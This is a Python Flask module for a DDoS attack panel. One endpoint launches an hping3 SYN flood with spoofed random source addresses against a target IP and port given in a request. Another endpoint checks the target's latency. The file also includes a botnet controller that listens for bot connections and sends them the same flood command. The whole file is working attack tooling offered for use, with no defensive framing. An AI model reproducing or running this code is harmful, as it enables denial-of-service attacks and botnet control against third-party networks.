from flask import Blueprint, request
import signal
import subprocess
import time
import socket
import threading

ddosAttack = Blueprint("ddosAttack", __name__, url_prefix="/ddosAttack")

@ddosAttack.post("/")
def SYNFloodAttack():
    data = request.get_json()
    ipAddress = data["ipAddress"]
    portNumber = data["portNumber"]
    packetSize = data["packetSize"]
    attackType = data["attackType"]
    duration = int(data["duration"])

    # launch dos on bots using a seperate thread
    bots = threading.Thread(target=botnet, args=(data))
    bots.start()

    dosCommand = subprocess.Popen(
        ['sudo', 'hping3', attackType, '-d', packetSize, '--flood', '--rand-source', '-p', portNumber, ipAddress],
        stdout=subprocess.PIPE,
        text=True)
    time.sleep(duration) # carry out attack for specified duration

    try:
        dosCommand.send_signal(signal.SIGINT) # Send CTRL+c to kill the child process
    except subprocess.TimeoutExpired:
        print('Timeout occured')
    
    dosCommand.kill()
    bots.join()
    return ""

@ddosAttack.post("/latency")
def checkLatency():
    data = request.get_json()
    ipAddress = data["ipAddress"]

    pingCommand = subprocess.Popen(['ping', '-c', '1', '-w', '2', '-O', ipAddress], stdout=subprocess.PIPE, text=True)
    output, _ = pingCommand.communicate()  # Capture the output and wait for the process to finish

    lines = output.splitlines()
    line = lines[1]

    if "time" in line:
        return '[PING SUCCESS] ' + line
    else:
        return '[PING FAILED] ' + line
    
#1
def send_commands(conn, data):
    ipAddress = data["ipAddress"]
    portNumber = data["portNumber"]
    packetSize = data["packetSize"]
    attackType = data["attackType"]
    duration = int(data["duration"])

    command = "sudo hping3 {attackType} -d {packetSize} --flood --rand-source -p {portNumber} {ipAddress}"
    cmd = command.format(
        attackType=attackType,
        packetSize=packetSize,
        portNumber=portNumber,
        ipAddress=ipAddress)

    if len(str.encode(cmd)) > 0:
        conn.send(str.encode(cmd))
        client_response = str(conn.recv(1024), "utf-8")
        print(client_response, end="")


def botnet(data):
    hostname=socket.gethostname()   
    bindIp=socket.gethostbyname(hostname)   
    bindIp = "192.168.1.34"
    bindPort = 1046
    servAdd = (bindIp, bindPort)
    
    # create socket to listen
    server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server.bind((servAdd))
    server.listen(5)
    print ("[*] listening on {}:{}".format(bindIp, bindPort))

    conn,addr = server.accept()
    print('accepted connection from {} and port {}'.format(addr[0], addr[1]))
    print("enter the commands below")
    
    # execute command
    send_commands(conn, data)
    conn.close()